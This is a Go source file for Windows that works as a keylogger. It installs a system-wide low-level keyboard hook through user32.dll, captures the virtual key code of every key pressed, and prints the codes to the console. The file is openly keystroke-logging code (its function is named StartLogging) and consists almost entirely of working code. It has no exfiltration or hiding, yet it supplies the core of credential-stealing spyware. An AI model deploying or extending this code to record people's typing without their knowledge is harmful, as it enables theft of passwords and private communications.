package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

var (
	keys                = make(chan byte)
	keyboardHook        HHOOK
	user32              = windows.NewLazySystemDLL("user32.dll")
	setWindowsHookExA   = user32.NewProc("SetWindowsHookExA")
	unhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	getMessageW         = user32.NewProc("GetMessageW")
	callNextHookEx      = user32.NewProc("CallNextHookEx")
)

/*
	Windows Data Types
	https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types
*/
type (
	DWORD     uint32
	WPARAM    uintptr
	LPARAM    uintptr
	LRESULT   uintptr
	HANDLE    uintptr
	HINSTANCE HANDLE
	HHOOK     HANDLE
	HWND      HANDLE
)

type HOOKPROC func(int, WPARAM, LPARAM) LRESULT

/*
	Contains information about a low-level keyboard input event.
	https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
*/
type KBDLLHOOKSTRUCT struct {
	VkCode      DWORD
	ScanCode    DWORD
	Flags       DWORD
	Time        DWORD
	DwExtraInfo uintptr
}

/*
	Contains message information from a thread's message queue.
	https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-msg
*/
type MSG struct {
	Hwnd    HWND
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

/*
	The POINT structure defines the x- and y- coordinates of a point.
	https://docs.microsoft.com/en-us/previous-versions//dd162805(v=vs.85)?redirectedfrom=MSDN
*/
type POINT struct {
	X, Y int32
}

const (
	/*
		The 'WH_KEYBOARD_LL' hook enables you to monitor keyboard input events about to be posted in a thread input queue.
		https://docs.microsoft.com/en-us/windows/win32/winmsg/about-hooks#wh_keyboard_ll
	*/
	WH_KEYBOARD_LL = 13

	/*
		WM_KEYDOWN : Posted to the window with the keyboard focus when a nonsystem key is pressed.
		A nonsystem key is a key that is pressed when the ALT key is not pressed.
	*/
	WM_KEYDOWN = 256
)

func main() {
	go StartLogging()

	for true {
		key := <-keys
		fmt.Printf("%q\n", key)
	}
}

func StartLogging() {
	keyboardHook := SetWindowsHookExA(WH_KEYBOARD_LL,
		func(codeInput int, wparam WPARAM, lparam LPARAM) LRESULT {
			if wparam == WM_KEYDOWN {
				kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
				code := byte(kbdstruct.VkCode)
				keys <- code
			}

			return CallNextHookEx(keyboardHook, codeInput, wparam, lparam)
		}, 0, 0)
	MessageLoop()
	UnhookWindowsHookEx(keyboardHook)
	keyboardHook = 0
}

/*
	MessageLoop is necessary for WH_KEYBOARD_LL
*/
func MessageLoop() {
	var msg MSG
	for GetMessage(&msg, 0, 0, 0) != 0 {
	}
}

/*
	Installs an application-defined hook procedure into a hook chain.
	You would install a hook procedure to monitor the system for certain types of events.
	These events are associated either with a specific thread or with all threads in the same desktop as the calling thread.
	https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
*/
func SetWindowsHookExA(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {
	ret, _, _ := setWindowsHookExA.Call(
		uintptr(idHook),
		syscall.NewCallback(lpfn),
		uintptr(hMod),
		uintptr(dwThreadId),
	)
	return HHOOK(ret)
}

/*
	Passes the hook information to the next hook procedure in the current hook chain.
	A hook procedure can call this function either before or after processing the hook information.
	https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex
*/
func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	ret, _, _ := callNextHookEx.Call(
		uintptr(hhk),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return LRESULT(ret)
}

/*
	Retrieves a message from the calling thread's message queue.
	The function dispatches incoming sent messages until a posted message is available for retrieval.
	https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessage
*/
func GetMessage(msg *MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32) int {
	ret, _, _ := getMessageW.Call(
		uintptr(unsafe.Pointer(msg)),
		uintptr(hwnd),
		uintptr(msgFilterMin),
		uintptr(msgFilterMax))
	return int(ret)
}

/*
	Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
	https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex
*/
func UnhookWindowsHookEx(hhk HHOOK) bool {
	ret, _, _ := unhookWindowsHookEx.Call(
		uintptr(hhk),
	)
	return ret != 0
}
